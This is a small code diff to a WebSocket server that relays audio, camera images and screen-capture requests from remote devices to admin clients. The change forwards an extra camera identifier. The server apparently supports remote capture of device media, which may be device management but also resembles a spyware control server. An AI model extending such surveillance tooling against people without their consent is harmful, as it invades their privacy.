@@ -74,7 +74,7 @@ wss.on('connection', (ws, req) => {
         } else if (data.type === 'audio') {
             broadcastToAdmins({ type: 'audio', deviceId: data.deviceId, audio: data.audio });
         } else if (data.type === 'camera') {
-            broadcastToAdmins({ type: 'camera', deviceId: data.deviceId, image: data.image });
+            broadcastToAdmins({ type: 'camera', deviceId: data.deviceId, image: data.image, camera: data.camera });
         } else if (data.type === 'request_screen') {
             const deviceWs = deviceClients.get(data.deviceId);
             if (deviceWs) deviceWs.send(JSON.stringify({ type: 'start_screen' }));
